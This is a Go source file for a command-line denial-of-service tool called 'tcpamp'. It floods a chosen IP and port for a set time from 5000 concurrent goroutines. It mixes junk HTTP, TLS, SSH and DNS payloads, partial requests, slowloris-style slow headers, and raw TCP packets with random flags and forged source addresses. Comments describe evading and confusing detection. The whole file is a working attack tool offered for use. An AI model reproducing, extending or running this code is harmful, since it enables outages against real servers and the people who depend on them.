package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	//"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	sentPackets uint64
	activeConns uint64
)

// Common HTTP payloads that trigger responses
var httpPayloads = [][]byte{
	[]byte("GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"),
	[]byte("GET /index.html HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0\r\n\r\n"),
	[]byte("POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\n\r\n"),
	[]byte("HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n"),
	[]byte("OPTIONS * HTTP/1.1\r\nHost: example.com\r\n\r\n"),
	[]byte("GET / HTTP/1.0\r\n\r\n"),
	[]byte("GET /robots.txt HTTP/1.1\r\nHost: example.com\r\n\r\n"),
	[]byte("GET /api/v1/test HTTP/1.1\r\nHost: localhost\r\n\r\n"),
}

// Common HTTPS/TLS payloads
var tlsPayloads = [][]byte{
	[]byte("\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03"), // TLS ClientHello start
	[]byte("\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03"), // TLS fragment
	[]byte("\x16\x03\x01\x00\x75\x01\x00\x00\x71\x03\x03"), // Short TLS
}

// SSH connection attempts
var sshPayloads = [][]byte{
	[]byte("SSH-2.0-OpenSSH_8.7p1 Ubuntu-7ubuntu2\r\n"),
	[]byte("SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7\r\n"),
}

// DNS query payloads
var dnsPayloads = [][]byte{
	[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"),
	[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01"),
}

// Random data patterns
var randomPatterns = [][]byte{
	make([]byte, 512),
	make([]byte, 1024),
	make([]byte, 256),
	make([]byte, 768),
	make([]byte, 1500),
}

// User agents for HTTP requests
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"curl/7.68.0",
	"Wget/1.20.3",
}

func init() {
	// Initialize random patterns
	for i := range randomPatterns {
		rand.Read(randomPatterns[i])
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: ./tcpamp <ip> <port> <time>")
		fmt.Println("Example: ./tcpamp 192.168.1.1 80 60")
		fmt.Println("Example: ./tcpamp 10.0.0.1 443 120")
		fmt.Println("Example: ./tcpamp 1.1.1.1 22 30")
		return
	}

	targetIP := os.Args[1]
	targetPort, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	fmt.Printf("[TCP-AMP] Starting amplification attack on %s:%d for %d seconds\n", 
		targetIP, targetPort, duration)
	fmt.Printf("[TCP-AMP] Using multiple protocols and bypass techniques\n")

	// Start multiple attack vectors
	threads := 5000
	for i := 0; i < threads; i++ {
		go amplifiedFlood(targetIP, targetPort, endTime)
	}

	// Statistics goroutine
	go func() {
		ticker := time.NewTicker(3 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if time.Now().After(endTime) {
				return
			}
			fmt.Printf("[Stats] Active: %d | Sent: %d\n", 
				atomic.LoadUint64(&activeConns), 
				atomic.LoadUint64(&sentPackets))
		}
	}()

	// Wait for attack duration
	for time.Now().Before(endTime) {
		time.Sleep(1 * time.Second)
	}

	fmt.Printf("[TCP-AMP] Attack completed. Total packets sent: %d\n", atomic.LoadUint64(&sentPackets))
}

func amplifiedFlood(targetIP string, targetPort int, endTime time.Time) {
	attackMethods := []string{"http", "tls", "ssh", "dns", "mixed", "raw", "partial", "slowloris"}
	
	for time.Now().Before(endTime) {
		method := attackMethods[rand.Intn(len(attackMethods))]
		
		switch method {
		case "http":
			httpAmplification(targetIP, targetPort)
		case "tls":
			tlsAmplification(targetIP, targetPort)
		case "ssh":
			sshAmplification(targetIP, targetPort)
		case "dns":
			dnsAmplification(targetIP, targetPort)
		case "mixed":
			mixedAmplification(targetIP, targetPort)
		case "raw":
			rawSocketFlood(targetIP, targetPort)
		case "partial":
			partialAmplification(targetIP, targetPort)
		case "slowloris":
			slowlorisAmplification(targetIP, targetPort)
		}
		
		// Variable delay to avoid detection
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(100)+10))
	}
}

func httpAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*3)
	if err != nil {
		return
	}
	defer conn.Close()

	// Enhanced HTTP payloads with more variations
	payload := httpPayloads[rand.Intn(len(httpPayloads))]
	conn.Write(payload)

	// Add headers to make it more realistic
	if rand.Intn(100) > 40 {
		headers := []string{
			"User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
			"Accept-Language: en-US,en;q=0.5\r\n",
			"Accept-Encoding: gzip, deflate\r\n",
			"Connection: keep-alive\r\n",
			"Cache-Control: max-age=0\r\n",
		}
		
		for i := 0; i < rand.Intn(3)+1; i++ {
			conn.Write([]byte(headers[rand.Intn(len(headers))]))
		}
		conn.Write([]byte("\r\n"))
	}

	atomic.AddUint64(&sentPackets, 1)
}

func tlsAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*3)
	if err != nil {
		return
	}
	defer conn.Close()

	// Send TLS-like handshake data
	payload := tlsPayloads[rand.Intn(len(tlsPayloads))]
	conn.Write(payload)

	// Add random TLS data
	if rand.Intn(100) > 30 {
		randomTLS := make([]byte, rand.Intn(500)+100)
		rand.Read(randomTLS)
		conn.Write(randomTLS)
	}

	atomic.AddUint64(&sentPackets, 1)
}

func sshAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*3)
	if err != nil {
		return
	}
	defer conn.Close()

	// Send SSH banner
	payload := sshPayloads[rand.Intn(len(sshPayloads))]
	conn.Write(payload)

	// Send SSH key exchange data
	if rand.Intn(100) > 50 {
		kexData := make([]byte, rand.Intn(200)+50)
		rand.Read(kexData)
		conn.Write(kexData)
	}

	atomic.AddUint64(&sentPackets, 1)
}

func dnsAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*2)
	if err != nil {
		return
	}
	defer conn.Close()

	// Send DNS query (TCP DNS)
	payload := dnsPayloads[rand.Intn(len(dnsPayloads))]
	conn.Write(payload)

	atomic.AddUint64(&sentPackets, 1)
}

func mixedAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*4)
	if err != nil {
		return
	}
	defer conn.Close()

	// Mix of different protocols to confuse detection
	protocols := []string{"http", "tls", "ssh", "dns", "random"}
	protocol := protocols[rand.Intn(len(protocols))]

	switch protocol {
	case "http":
		conn.Write(httpPayloads[rand.Intn(len(httpPayloads))])
	case "tls":
		conn.Write(tlsPayloads[rand.Intn(len(tlsPayloads))])
	case "ssh":
		conn.Write(sshPayloads[rand.Intn(len(sshPayloads))])
	case "dns":
		conn.Write(dnsPayloads[rand.Intn(len(dnsPayloads))])
	case "random":
		conn.Write(randomPatterns[rand.Intn(len(randomPatterns))])
	}

	// Sometimes send multiple protocol attempts
	if rand.Intn(100) > 70 {
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(100)))
		conn.Write(randomPatterns[rand.Intn(len(randomPatterns))])
	}

	atomic.AddUint64(&sentPackets, 1)
}

func partialAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*2)
	if err != nil {
		return
	}
	defer conn.Close()

	// Send incomplete requests to tie up resources
	partialRequests := [][]byte{
		[]byte("GET /"),
		[]byte("POST "),
		[]byte("HEAD "),
		[]byte("OPTIONS "),
		[]byte("\x16\x03"), // Partial TLS
		[]byte("SSH-2.0"),  // Partial SSH
	}

	conn.Write(partialRequests[rand.Intn(len(partialRequests))])

	// Sometimes send more partial data
	if rand.Intn(100) > 60 {
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(200)))
		conn.Write([]byte(" HTTP/1.1\r\n"))
	}

	atomic.AddUint64(&sentPackets, 1)
}

func slowlorisAmplification(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	conn, err := net.DialTimeout("tcp", 
		fmt.Sprintf("%s:%d", targetIP, targetPort), 
		time.Second*5)
	if err != nil {
		return
	}
	defer conn.Close()

	// Slowloris-style attack - send headers slowly
	conn.Write([]byte("GET / HTTP/1.1\r\n"))
	time.Sleep(time.Millisecond * time.Duration(rand.Intn(500)+100))
	
	conn.Write([]byte("Host: " + targetIP + "\r\n"))
	time.Sleep(time.Millisecond * time.Duration(rand.Intn(500)+100))
	
	// Send random headers slowly
	headers := []string{
		"User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n",
		"Accept: */*\r\n",
		"X-Requested-With: XMLHttpRequest\r\n",
		"Referer: http://example.com/\r\n",
	}
	
	for i := 0; i < rand.Intn(5)+2; i++ {
		conn.Write([]byte(headers[rand.Intn(len(headers))]))
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(300)+50))
	}

	atomic.AddUint64(&sentPackets, 1)
}

func rawSocketFlood(targetIP string, targetPort int) {
	atomic.AddUint64(&activeConns, 1)
	defer atomic.AddUint64(&activeConns, ^uint64(0))

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)

	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return
	}

	// Use random source port (any port, not just common ones)
	srcPort := uint16(rand.Intn(65535-1024) + 1024)

	// Build IP header
	ipHeader := buildIPHeader(dstIP)
	
	// Build TCP header with random source port
	tcpHeader := buildTCPHeader(srcPort, uint16(targetPort))

	packet := append(ipHeader, tcpHeader...)

	// Send raw packet
	syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
		Port: targetPort,
		Addr: [4]byte{dstIP[0], dstIP[1], dstIP[2], dstIP[3]},
	})

	atomic.AddUint64(&sentPackets, 1)
}

func buildIPHeader(dst net.IP) []byte {
	ipHeader := make([]byte, 20)
	
	// Version + IHL
	ipHeader[0] = 0x45
	// Type of service
	ipHeader[1] = 0x00
	// Total length (20 bytes IP + 20 bytes TCP)
	binary.BigEndian.PutUint16(ipHeader[2:4], 40)
	// Identification
	binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))
	// Flags + Fragment offset
	ipHeader[6] = 0x40
	ipHeader[7] = 0x00
	// TTL
	ipHeader[8] = byte(rand.Intn(30) + 32) // Random TTL between 32-62
	// Protocol (TCP)
	ipHeader[9] = syscall.IPPROTO_TCP
	
	// Source IP (use local IP or random private IP)
	srcIP := generateSourceIP()
	copy(ipHeader[12:16], srcIP)
	
	// Destination IP
	copy(ipHeader[16:20], dst)
	
	// Calculate checksum
	checksum := calculateChecksum(ipHeader)
	binary.BigEndian.PutUint16(ipHeader[10:12], checksum)
	
	return ipHeader
}

func buildTCPHeader(srcPort, dstPort uint16) []byte {
	tcpHeader := make([]byte, 20)
	
	// Source port (any port)
	binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
	// Destination port
	binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)
	// Sequence number
	binary.BigEndian.PutUint32(tcpHeader[4:8], rand.Uint32())
	// Acknowledgement number
	binary.BigEndian.PutUint32(tcpHeader[8:12], rand.Uint32())
	// Data offset + flags
	tcpHeader[12] = 0x50 // Data offset = 5 (20 bytes)
	
	// Random flags (SYN, ACK, RST, etc.)
	flags := []uint8{0x02, 0x10, 0x04, 0x01, 0x14, 0x18} // SYN, ACK, RST, FIN, SYN+ACK, PSH+ACK
	tcpHeader[13] = flags[rand.Intn(len(flags))]
	
	// Window size (random)
	binary.BigEndian.PutUint16(tcpHeader[14:16], uint16(rand.Intn(65535)))
	// Urgent pointer
	binary.BigEndian.PutUint16(tcpHeader[18:20], 0)
	
	return tcpHeader
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}

func generateSourceIP() net.IP {
	// Use local IP or generate realistic source IPs
	if rand.Intn(100) > 50 {
		// Try to get local IP
		conn, err := net.Dial("udp", "8.8.8.8:80")
		if err == nil {
			defer conn.Close()
			localAddr := conn.LocalAddr().(*net.UDPAddr)
			return localAddr.IP.To4()
		}
	}
	
	// Fallback to random private IP - simplified without unused variables
	return net.IPv4(
		byte(rand.Intn(256)),
		byte(rand.Intn(256)),
		byte(rand.Intn(256)),
		byte(rand.Intn(254)+1),
	)
}
